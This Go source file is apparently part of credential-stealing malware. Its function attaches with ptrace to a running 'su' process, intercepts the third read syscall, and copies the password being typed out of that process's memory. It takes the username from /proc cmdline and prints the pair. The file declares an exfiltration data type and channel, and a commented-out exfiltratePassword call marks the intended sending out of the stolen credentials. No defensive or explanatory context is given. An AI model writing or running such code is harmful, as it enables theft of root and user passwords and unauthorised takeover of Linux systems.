package main

import (
	"fmt"
	"io/ioutil"
	"strings"
	"syscall"
	"unicode"
)

var exfilChannel = make(chan ExfilData)

type ExfilData struct {
	Username string
	Password string
}

func traceSUProcess(pid int) {
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var regs syscall.PtraceRegs
	var readSyscallCount int
	for {
		_, err := syscall.Wait4(pid, nil, 0, nil)
		if err != nil {
			return
		}

		err = syscall.PtraceGetRegs(pid, &regs)
		if err != nil {
			fmt.Printf("su process died.")
			return
		}
		if regs.Orig_rax == 0 && regs.Rdx == 511 && regs.Rdi == 0 {
			readSyscallCount++
			if readSyscallCount == 3 {
				bufferAddr := uintptr(regs.Rsi)
				buffer := make([]byte, 511)

				_, err := syscall.PtracePeekData(pid, bufferAddr, buffer)
				if err != nil {
					return
				}
				if strings.Contains(string(buffer), "\n") {
					cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
					if err != nil {
						return
					}

					username := "root"
					if len(cmdline) > 3 {
						username = string((cmdline[3:]))
					}
					password := strings.Split(string(buffer), "\n")[0]
					if func(s string) bool {
						for _, r := range s {
							if !unicode.IsPrint(r) {
								return false
							}
						}
						return true
					}(password) {
						//exfiltratePassword(strings.TrimLeft(string(password), "\n"), username)
						fmt.Printf("u: %s, p: %s\n", username, password)
					}
				}
				return
			}

		}
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}
